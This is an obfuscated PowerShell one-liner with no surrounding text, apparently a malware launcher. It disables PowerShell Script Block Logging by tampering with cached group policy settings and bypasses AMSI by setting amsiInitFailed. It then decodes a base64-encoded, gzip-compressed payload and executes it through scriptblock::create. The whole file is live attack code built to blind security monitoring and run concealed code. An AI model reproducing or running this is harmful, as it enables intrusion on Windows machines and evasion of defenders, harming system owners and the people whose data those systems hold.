$jvXKr=(('Sc'+'ri{1}t{2}lock{'+'0}'+'og'+'ging')-f'L','p','B'); $p1=(('Ena'+'bl{0}{3'+'}c'+'{2}ip{1}Bl'+'oc'+'kLogging')-f'e','t','r','S');If($PSVersionTable.PSVersion.Major -ge 3){ $oiDpB=[Ref].Assembly.GetType((('{0}{5}stem.Mana{1'+'}eme'+'nt.{3'+'}u'+'tomati'+'o'+'n.{2}ti{4}'+'s')-f'S','g','U','A','l','y')); $vos0=$oiDpB.GetField('cachedGroupPolicySettings','NonPublic,Static'); $dI=[Collections.Generic.Dictionary[string,System.Object]]::new(); $uwrdw=[Ref].Assembly.GetType((('{1'+'}{5}'+'s'+'t'+'em'+'.{'+'4}a{9}a{'+'3'+'}'+'eme{'+'9}t'+'.'+'{8}{0}t{7}mati{7}{'+'9}.'+'{'+'8'+'}m'+'si'+'{2'+'}ti{'+'6}s')-f'u','S','U','g','M','y','l','o','A','n')); $kK=((''+'{2}nabl{4}Sc'+'{'+'3}i'+'{0}t{5}loc'+'kIn{1'+'}ocation'+'Logging')-f'p','v','E','r','e','B'); if ($uwrdw) { $uwrdw.GetField((('a'+'m{0'+'}iI{4}'+'i{1}Fai'+'{'+'2}{3'+'}'+'d'+'')-f's','t','l','e','n'),'NonPublic,Static').SetValue($null,$true); }; If ($vos0) { $pzV=$vos0.GetValue($null); If($pzV[$jvXKr]){ $pzV[$jvXKr][$kK]=0; $pzV[$jvXKr][$p1]=0; } $dI.Add($kK,0); $dI.Add($p1,0); $pzV['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$jvXKr]=$dI; } Else { [Ref].Assembly.GetType((('S{3'+'}{1}tem.{5}an'+'a{2'+'}ement.'+'A{'+'4}'+'tomation.S'+'cript{0}lock'+'')-f'B','s','g','y','u','M')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIANWsdWQCA7VWbW+jOB{1}+ftL+B7SKBGjTQF6u21Za6Qy{2}kLZJk9K8b3RywQ{2}3BqfgNJvu7X+/gYSmVdu7vZPWUlpsz4zHzzwz48U69gTlsSTSu3Pp+4ffpP3o4'+'QRHklLyj/1RWSrdt7qP6mG3JI5T6YukzNBqZf{2}I03h+dmauk4T{2}YjevtIhAaUqiW0ZJqqjSX9IoJAk5urq9I56QvkulPystxm8x24ttTeyFR{1}pCsZ/tXXIPZ55V3BWjQpG/fpXV2VF1XmnerzFLFdndpoJ{2}FZ8xWZV+qNmBN9sVUeQO9RKe8oWojGhcr1UGcYoXpAvWHkiHiJ{1}7qQx3OdwmIWKdxPmlMis7GUWGz17CPeT7CUlTuSzNMvu'+'z+fwPZbY//HodCxqRSjsWJO{2}rlyQP1CN'+'pxcGxz8g1WcxByxUJjYO5qoLYA18SpRSvGStL/8WM0iWbArqfVVKeK4FUTyRqGUL6+pod7q8Z2SnKb/iZs0CFUTAB4PuRIbgo6LOxSfIGfQ4LxZjlOwRcVno8pbnyF0kvSx04HQuebGFauknWRJ0/'+'AS6VqN28bpZ/1ly10AXNWw8WZkNO/flB/UX4Sw+LTOR9KltkQWNibWMcUa9gq/JWSMiCkRyQSiHWBe8Ueb9BfIsw{2}mCRoZwx45VaM6LiS'+'ddYU+aTBHkQ1hS8goirL53ZBU6R23GHRI{1}dbg5ULS0gR0ghvc+LbXF6Ng'+'ch2WQ4TctSbw1J6pUll2BG/LK'+'{2}4pTut9Ba8Px'+'TPrjbWTNBP'+'ZyKwtxcfQHm/lCTx6lI1h7{2}FAC4cVf{2}o5hleJQlh/r{2}2Lo0KA6X30T'+'{1}xIxB6oClB4gGrGQouCJjSgJ+7lihVlwi2tGKkQi{2}8pphMxxAhdhnSM4tHBBfftP'+'PIg92pM9gKfB45iX{2}2mVclKUhTQTUnwziW+/'+'/ufC68IAv'+'ZkL2gVGK5JoZW5Gxv3RPMn7u4cnBSAQAYSc8MnBKjhu7CqN81K5o{1}8GYWI5LyXBJq+0N/{1}rwG1if/YvzO0ej9TbveGbaa9kniG6CjXfSRZ5/7pNTF+T6VG+fIN+87{1}vhOPQM/QY5/UFbTNpt0W4h5yb0mN'+'6zHM2dp{1}rdOKOOZxmPm1oKLG00nLGO6vXGVV1fAnQTWg2WyO9GdPPt{2}r6hlF5dGu3U0NuseW5e345q9nT{2}HK1hh4sRT93jiaVp2qmPrc4WIYP79c52XL3mN44XG'+'Y2Ya6dmY4m'+'aCJlxc2gb/GJiJKin{1}XG'+'w4uy8aXmjw{2}RGvUrJt{1}+wjX7fNtCgdXdvnWqBdjoa49AY{1}Wt0uhpfhzC3N07/QtMbbZ888ukGgGtxhINrkAnMmhcuQMb6hIxPXZ7W8NLgyAAZe3qPWuFkZfcY7N8MahwNWXeM0eV0a2taddJrI{2}fno1aA+iCOA6OPUfpgPVpadehzf/R7d7LQhmP2WbPMfi8cZ3fWVlH2d+NYF960uvGuPp9cjugw4migacOPQInZgMaiXpuXtlNcz0rmh99KxLt7xoz3GkIHJ2mIGTAGSn2RszZP7H3x7nGaaShK/gZYkiQm{1}NomNNaC7Ygx7'+'mW9Iy/z0Ld23SRrboN27tVbX6r0JKgemkqxdHY2BS+zhkIqlyQORFjWv9V1HVqB/k1v5Hny8zcz+WqrgKly1koyXHaGWW4YbNGFpCi/Hih4LwioXe9{1}9R5qcPYSag3Uvl0JyLAzOGfPkdtd64kHB9wAsCpce5Y9FHJ6gPoRuYcHTdZGn7flUm{1}9WsLsy1gI//x/I8xh7R92f4p{'+'2}ejnH5tXqy4Vn1f8XIj{1}CVICkCwWZkd3z4G0g9knyLL6BBSmw2I/sxXy1FkddeIPl{1'+'}eFv679OyqsLAAA{0}')-f'=','D','E')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
